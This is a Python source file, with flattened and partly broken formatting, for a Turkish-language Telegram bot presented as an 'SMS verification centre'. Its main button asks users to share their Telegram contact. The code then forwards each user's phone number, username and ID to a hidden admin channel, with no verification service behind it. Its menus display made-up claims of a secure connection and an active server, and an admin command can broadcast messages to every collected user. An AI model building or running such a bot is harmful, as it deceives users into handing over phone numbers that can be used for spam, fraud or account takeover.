Enterprise SMS Verify Bot

python-telegram-bot v20+

import os import random from datetime import datetime from zoneinfo import ZoneInfo

from telegram import ( Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, Contact ) from telegram.ext import ( ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, CallbackQueryHandler, filters )

=====================================================

CONFIG

=====================================================

TOKEN = os.getenv("BOT_TOKEN") KANAL_ID = os.getenv("KANAL_ID") ADMIN_ID = int(os.getenv("ADMIN_ID")) TZ = ZoneInfo("Europe/Istanbul")

=====================================================

DATABASE (memory based)

=====================================================

class Database: def init(self): self.users = {} self.banned = set() self.waiting_contact = set() self.total_numbers = 0

def add_user(self, user):
    if user.id not in self.users:
        self.users[user.id] = {
            "username": f"@{user.username}" if user.username else "Yok",
            "name": user.first_name,
            "join": datetime.now(TZ).strftime("%d.%m.%Y"),
            "numbers": 0
        }

def ban(self, uid):
    self.banned.add(uid)

def unban(self, uid):
    self.banned.discard(uid)

DB = Database()

=====================================================

UI BUILDERS

=====================================================

def main_menu_text(user): now = datetime.now(TZ).strftime("%d.%m.%Y • %H:%M") username = f"@{user.username}" if user.username else user.first_name

return f"""

┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 📲 SMS ONAY MERKEZİ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

Merhaba {username} 👋 Sisteme güvenli bağlantı kuruldu.

╭─────────────── Kullanıcı ───────────────╮ │ 👤 Kullanıcı : {username} │ 🆔 ID        : {user.id} │ 🔐 Durum     : Aktif ╰──────────────────────────────────────────╯

╭─────────────── Sistem ───────────────────╮ │ 🌍 Bölge      : Türkiye │ 🕒 Saat       : {now} │ 🟢 Sunucu     : Aktif │ ⚙️ Versiyon   : v2.0 ╰──────────────────────────────────────────╯

Aşağıdaki menüden işlem seçebilirsiniz. """

def main_menu_buttons(uid): rows = [ [InlineKeyboardButton("📩 SMS Onay", callback_data="sms")], [InlineKeyboardButton("👤 Hesabım", callback_data="account"), InlineKeyboardButton("🌐 Ülkeler", callback_data="countries")], [InlineKeyboardButton("📊 İstatistik", callback_data="stats"), InlineKeyboardButton("📜 Kurallar", callback_data="rules")], [InlineKeyboardButton("🧑‍💻 Geliştirici", callback_data="dev"), InlineKeyboardButton("🆘 Destek", callback_data="support")] ] if uid == ADMIN_ID: rows.append([InlineKeyboardButton("🔐 Admin Panel", callback_data="admin")]) return InlineKeyboardMarkup(rows)

=====================================================

MIDDLEWARE BAN CHECK

=====================================================

async def blocked(update: Update): user = update.effective_user if user and user.id in DB.banned: if update.message: await update.message.reply_text("⛔ Bu botu kullanman yasaklandı.") elif update.callback_query: await update.callback_query.answer("Yasaklısın", show_alert=True) return True return False

=====================================================

START

=====================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): if await blocked(update): return

user = update.effective_user
DB.add_user(user)
await update.message.reply_text(main_menu_text(user), reply_markup=main_menu_buttons(user.id))

=====================================================

CALLBACK HANDLER

=====================================================

async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE): if await blocked(update): return

query = update.callback_query
await query.answer()
user = query.from_user

if query.data == "sms":
    DB.waiting_contact.add(user.id)
    kb = [[KeyboardButton("📩 SMS Onay", request_contact=True)]]
    await query.message.reply_text("Numaranı göndermek için butona bas:", reply_markup=ReplyKeyboardMarkup(kb, resize_keyboard=True))

elif query.data == "account":
    u = DB.users[user.id]
    await query.message.reply_text(f"""

👤 Hesap Bilgilerin

Kullanıcı : {u['username']} ID        : {user.id} Katılım   : {u['join']} Gönderim  : {u['numbers']} """)

elif query.data == "countries":
    ulkeler = ["Türkiye","Almanya","Fransa","ABD","İngiltere","Japonya"]
    await query.message.reply_text("Desteklenen Ülkeler:\n" + "\n".join(ulkeler))

elif query.data == "stats":
    await query.message.reply_text(f"Toplam Kullanıcı: {len(DB.users)}\nToplam Numara: {DB.total_numbers}")

elif query.data == "rules":
    await query.message.reply_text("Kurallar:\nSpam yasaktır\nFake numara yasaktır")

elif query.data == "dev":
    await query.message.reply_text("Geliştirici: @tanrican")

elif query.data == "support":
    await query.message.reply_text("Destek için admin ile iletişime geçin")

elif query.data == "admin" and user.id == ADMIN_ID:
    await query.message.reply_text("Admin Panel\n/ban ID\n/unban ID\n/duyuru mesaj")

=====================================================

CONTACT HANDLER

=====================================================

async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE): if await blocked(update): return

user = update.effective_user
if user.id not in DB.waiting_contact:
    return

c: Contact = update.message.contact
DB.waiting_contact.remove(user.id)

DB.users[user.id]["numbers"] += 1
DB.total_numbers += 1

now = datetime.now(TZ).strftime("%d.%m.%Y %H:%M:%S")

await context.bot.send_message(KANAL_ID, f"""

☎️ NUMARA ALINDI 👤 {DB.users[user.id]['username']} 🆔 {user.id} 📱 +{c.phone_number} ⏰ {now} """)

await update.message.reply_text("Numara alındı ✅")

=====================================================

ADMIN COMMANDS

=====================================================

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return uid = int(context.args[0]) DB.ban(uid) await update.message.reply_text(f"{uid} banlandı")

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return uid = int(context.args[0]) DB.unban(uid) await update.message.reply_text(f"{uid} ban kaldırıldı")

async def duyuru(update: Update, context: ContextTypes.DEFAULT_TYPE): if update.effective_user.id != ADMIN_ID: return msg = " ".join(context.args) for uid in DB.users: try: await context.bot.send_message(uid, msg) except: pass

=====================================================

MAIN

=====================================================

def main(): app = ApplicationBuilder().token(TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("ban", ban))
app.add_handler(CommandHandler("unban", unban))
app.add_handler(CommandHandler("duyuru", duyuru))

app.add_handler(CallbackQueryHandler(callbacks))
app.add_handler(MessageHandler(filters.CONTACT, contact))

print("Bot aktif...")
app.run_polling()

if name == "main": main()
